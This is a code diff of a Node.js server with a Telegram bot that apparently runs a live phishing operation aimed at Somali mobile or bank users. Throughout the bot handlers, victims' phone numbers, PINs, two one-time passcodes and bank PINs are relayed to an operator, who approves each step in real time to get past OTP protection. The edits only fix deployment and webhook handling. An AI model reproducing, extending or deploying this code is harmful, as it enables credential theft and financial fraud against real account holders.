@@ -1,7 +1,11 @@
 const express = require('express');
 const { Telegraf } = require('telegraf');
 const path = require('path');
-require('dotenv').config();
+
+// Load environment variables locally if not in production
+if (process.env.NODE_ENV !== 'production') {
+    require('dotenv').config();
+}
 
 const app = express();
 const PORT = process.env.PORT || 8080;
@@ -9,7 +13,8 @@ const DOMAIN = process.env.RAILWAY_PUBLIC_URL || process.env.DOMAIN || "";
 
 // -------------------- INIT BOT --------------------
 if (!process.env.BOT_TOKEN) {
-    throw new Error("BOT_TOKEN is missing in .env");
+    console.error("❌ CRITICAL ERROR: BOT_TOKEN is missing from environment variables.");
+    process.exit(1);
 }
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
@@ -19,7 +24,7 @@ const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
 const statusStore = {};
 
 // -------------------- TELEGRAM WEBHOOK MIDDLEWARE --------------------
-// CRITICAL: This MUST be placed BEFORE app.use(express.json()) to prevent body parsing issues
+// CRITICAL: Placed BEFORE express.json() to prevent streaming/parsing interference
 const WEBHOOK_PATH = `/webhook/${process.env.BOT_TOKEN}`;
 if (DOMAIN) {
     app.use(bot.webhookCallback(WEBHOOK_PATH));
@@ -246,47 +251,38 @@ app.post('/api/verify-bank-pin', async (req, res) => {
 
 // -------------------- BOT ACTIONS --------------------
 
-// APPROVE
 bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
     statusStore[phone] = "approved";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
-
     const approvedMsg = `✅ <b>LOGIN APPROVED</b>\n\n🆕 <b>NEW USER</b>\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Approved</b>\n➡️ <b>Next: First OTP (1/2)</b>\n⏱️ <b>${currentTime}</b>`;
-
     try {
         await ctx.answerCbQuery("Allowed");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(approvedMsg);
-    } catch (e) { console.error("Error running approve action:", e); }
+    } catch (e) { console.error(e); }
 });
 
-// DENY
 bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
     statusStore[phone] = "denied";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
-
     const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n❌ <b>Status: Rejected</b>\n⏱️ <b>${currentTime}</b>`;
-
     try {
         await ctx.answerCbQuery("Rejected");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(deniedMsg);
-    } catch (e) { console.error("Error running deny action:", e); }
+    } catch (e) { console.error(e); }
 });
 
-// OTP1 CORRECT
 bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const otp = ctx.match[2];
     statusStore[phone] = "otp1_correct";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
-
     const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${otp}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: First OTP verified</b>\n➡️ <b>Next: Second OTP (2/2) will be sent</b>\n⌛ <b>${currentTime}</b>`;
-
     try {
         await ctx.answerCbQuery("Verified");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
@@ -294,7 +290,6 @@ bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
     } catch (e) { console.error(e); }
 });
 
-// OTP1 WRONG
 bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp1_wrong";
@@ -305,15 +300,12 @@ bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     } catch (e) { console.error(e); }
 });
 
-// OTP2 CORRECT
 bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const otp = ctx.match[2];
     statusStore[phone] = "otp2_correct";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
-
     const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔐 <b>${otp}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Second OTP verified</b>\n✅ <b>Process Complete</b>\n⌛ <b>${currentTime}</b>`;
-
     try {
         await ctx.answerCbQuery("Finalized");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
@@ -321,7 +313,6 @@ bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
     } catch (e) { console.error(e); }
 });
 
-// OTP2 WRONG
 bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp2_wrong";
@@ -332,14 +323,11 @@ bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
     } catch (e) { console.error(e); }
 });
 
-// BANK PIN CORRECT
 bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
     statusStore[phone] = "bank_pin_correct";
-    
     const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>\n\n🇸🇴 <b>Somalia</b>\n📱 <b>${phone}</b>\n🔑 <b>${pin}</b>\n\n━━━━━━━━━━━━━━━\n\n✅ <b>Status: Process Completed</b>\n🏁 <b>User redirected to Success page</b>`;
-
     try {
         await ctx.answerCbQuery("Bank PIN Verified");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
@@ -347,7 +335,6 @@ bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
     } catch (e) { console.error(e); }
 });
 
-// BANK PIN WRONG
 bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "bank_pin_wrong";
@@ -358,7 +345,6 @@ bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
     } catch (e) { console.error(e); }
 });
 
-// OTP2 WRONG PIN
 bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp2_wrongpin";
@@ -387,23 +373,20 @@ app.get('/:page', (req, res, next) => {
 // -------------------- START SERVER & WEBHOOK --------------------
 app.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    try {
-        if (DOMAIN) {
+    
+    if (DOMAIN) {
+        try {
             const formattedDomain = DOMAIN.startsWith('http') ? DOMAIN : `https://${DOMAIN}`;
             const fullWebhookUrl = `${formattedDomain}${WEBHOOK_PATH}`;
             
-            // Re-bind webhook cleanly on boot
-            await bot.telegram.deleteWebhook({ drop_pending_updates: true });
-            await bot.telegram.setWebhook(fullWebhookUrl);
-            console.log(`🤖 Webhook successfully synchronized to: ${fullWebhookUrl}`);
-        } else {
-            console.warn("⚠️ Webhook skipped: RAILWAY_PUBLIC_URL or DOMAIN variables are unassigned.");
-            // Fallback to launch long-polling locally if no domain is provided
-            bot.launch();
-            console.log("🤖 Running fallback Long Polling setup...");
+            // This force-switches Telegram over to webhook delivery, instantly breaking any active long-polling conflict loops
+            await bot.telegram.setWebhook(fullWebhookUrl, { drop_pending_updates: true });
+            console.log(`🤖 Webhook synced completely at: ${fullWebhookUrl}`);
+        } catch (err) {
+            console.error("Webhook synchronization failed:", err);
         }
-    } catch (err) {
-        console.error("Webhook binding failure:", err);
+    } else {
+        console.error("❌ CRITICAL: RAILWAY_PUBLIC_URL is missing. Webhooks cannot establish a secure link without a DOMAIN mapping.");
     }
 });
         
